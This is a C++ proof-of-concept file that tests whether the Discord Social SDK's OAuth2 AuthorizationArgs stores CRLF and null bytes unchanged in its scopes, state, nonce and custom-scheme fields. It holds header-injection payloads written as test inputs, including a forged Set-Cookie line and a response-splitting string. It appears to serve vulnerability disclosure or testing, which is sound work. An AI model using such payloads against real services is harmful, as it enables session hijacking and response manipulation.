// Proof of Concept: CRLF Injection in OAuth2 Fields
// Discord Social SDK v1.8.14587
//
// Shows that AuthorizationArgs stores CRLF verbatim in scopes, state, nonce fields.
//
// Build:
//   g++ -std=c++17 -DDISCORDPP_IMPLEMENTATION \
//       -I../../sdk/include poc_crlf_injection.cc \
//       -L../../build -ldiscord_partner_sdk \
//       -Wl,-rpath,../../build -o poc_crlf
//
// Run:
//   LD_LIBRARY_PATH=../../build ./poc_crlf

#define DISCORDPP_IMPLEMENTATION
#include "../../sdk/include/discordpp.h"

#include <cassert>
#include <cstdio>
#include <string>

bool hasCRLF(const std::string& s) {
    return s.find("\r\n") != std::string::npos;
}

int main() {
    printf("================================================\n");
    printf("Discord Social SDK v%d.%d.%d - CRLF Injection PoC\n",
           discordpp::Client::GetVersionMajor(),
           discordpp::Client::GetVersionMinor(),
           discordpp::Client::GetVersionPatch());
    printf("================================================\n\n");

    discordpp::AuthorizationArgs args;
    args.SetClientId(1482163567053766686ULL);

    int vulns = 0;

    // --------------------------------------------------------
    // Test 1: CRLF in scopes
    // --------------------------------------------------------
    {
        std::string evil = "identify guilds\r\nX-Injected: evil-value";
        args.SetScopes(evil);
        std::string rb = args.Scopes();

        bool vuln = hasCRLF(rb);
        if (vuln) vulns++;

        printf("[Scopes]  CRLF preserved: %s\n", vuln ? "YES [VULN]" : "NO [safe]");
        if (vuln) {
            printf("          Input:  %s\n", evil.c_str());
            printf("          Output: %s\n", rb.c_str());
        }
    }

    // --------------------------------------------------------
    // Test 2: CRLF in state (OAuth2 CSRF token)
    // --------------------------------------------------------
    {
        std::string evil = "csrf-token\r\nContent-Length: 0\r\n\r\n<html>body</html>";
        args.SetState(evil);
        auto rb = args.State();

        bool vuln = rb && hasCRLF(*rb);
        if (vuln) vulns++;

        printf("[State]   CRLF preserved: %s\n", vuln ? "YES [VULN]" : "NO [safe]");
        if (vuln) {
            printf("          Input  len=%zu output len=%zu\n", evil.size(), rb->size());
        }
    }

    // --------------------------------------------------------
    // Test 3: CRLF in nonce
    // --------------------------------------------------------
    {
        std::string evil = "mynonce\r\nSet-Cookie: session=evil";
        args.SetNonce(evil);
        auto rb = args.Nonce();

        bool vuln = rb && hasCRLF(*rb);
        if (vuln) vulns++;

        printf("[Nonce]   CRLF preserved: %s\n", vuln ? "YES [VULN]" : "NO [safe]");
    }

    // --------------------------------------------------------
    // Test 4: CRLF in customSchemeParam
    // --------------------------------------------------------
    {
        std::string evil = "mygame://auth\r\nX-Custom: injected";
        args.SetCustomSchemeParam(evil);
        auto rb = args.CustomSchemeParam();

        bool vuln = rb && hasCRLF(*rb);
        if (vuln) vulns++;

        printf("[Scheme]  CRLF preserved: %s\n", vuln ? "YES [VULN]" : "NO [safe]");
    }

    // --------------------------------------------------------
    // Test 5: Null byte in state (CSRF token bypass)
    // --------------------------------------------------------
    {
        std::string s = std::string("csrf-state") + '\0' + "extra-data-ignored";
        args.SetState(s);
        auto rb = args.State();

        bool full_preserved = rb && (rb->size() == s.size());
        printf("[State/NUL] NUL byte preserved (full len=%zu): %s\n",
               s.size(), full_preserved ? "YES" : "NO");
        if (full_preserved) vulns++;
    }

    printf("\n================================================\n");
    printf("Result: %d/5 CRLF/injection vectors confirmed\n", vulns);
    printf("================================================\n");

    return vulns > 0 ? 1 : 0;
}
